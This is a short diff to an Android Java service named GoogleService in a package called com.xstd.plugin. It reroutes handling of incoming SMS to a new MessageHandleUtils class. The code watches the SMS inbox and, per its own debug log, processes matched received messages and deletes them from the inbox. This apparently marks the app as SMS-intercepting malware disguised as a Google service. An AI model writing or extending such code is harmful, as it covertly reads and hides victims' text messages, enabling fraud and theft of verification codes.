@@ -14,6 +14,7 @@ import android.os.IBinder;
 import android.text.TextUtils;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.MessageHandleUtils;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.receiver.PrivateSMSBRC;
@@ -144,7 +145,7 @@ public class GoogleService extends Service {
                     if (Config.DEBUG) {
                         Config.LOGD("[[ContentObserver::onChanged]] The message is RECEIVED message");
                     }
-                    if (PrivateSMSBRC.handleMessage(getApplicationContext(), body, fromAddress)) {
+                    if (MessageHandleUtils.handleMessage(getApplicationContext(), body, fromAddress)) {
                         if (Config.DEBUG) {
                             Config.LOGD("[[ContentObserver::onChanged]] content observer find the message : [[" + body + "]] should handle " +
                                             "and delete from " + SMS_INBOX_URI);
